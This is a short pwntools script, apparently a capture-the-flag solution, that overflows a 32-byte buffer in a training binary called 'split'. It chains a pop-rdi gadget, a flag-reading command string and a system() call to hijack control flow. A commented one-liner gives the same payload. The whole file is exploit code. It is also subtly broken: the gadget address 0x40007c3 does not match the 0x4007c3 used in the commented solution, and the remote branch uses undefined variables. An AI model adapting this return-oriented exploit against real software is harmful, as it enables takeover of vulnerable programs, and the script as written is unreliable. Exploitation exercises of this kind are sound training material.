from pwn import *

binary = './split'

system_pwnme = 0x40074b
random_ret_addr = 0x400741

system_ls = 0x40084a
system_cat = 0x601060

gadget_rdi = 0x40007c3

# b"a"* 40 + b"\x41\x07\x40\x00\x00\x00\x00\x00" + b"\x42\07\x40\x00\x00\x00\x00\x00"
# what worked in gdb 

# solution : python3 -c 'import sys;sys.stdout.buffer.write(b"a"* 40 + b"\xc3\x07\x40\x00\x00\x00\x00\x00" + b"\x60\x10\x60\x00\x00\x00\x00\x00" + b"\x4b\07\x40\x00\x00\x00\x00\x00")' | ./split


padding = b'a' * 40 # the buffer is 32 bytes and the read functions reads 96 bytes


payload = padding
payload += p64(gadget_rdi)
payload += p64(system_cat)
payload += p64(system_pwnme)



DEBUG = True

if DEBUG:
    io = process(binary)
else:
    io = remote(server, port)


print(io.recv())
io.sendline(payload)
print(io.recv())
print(io.recv())
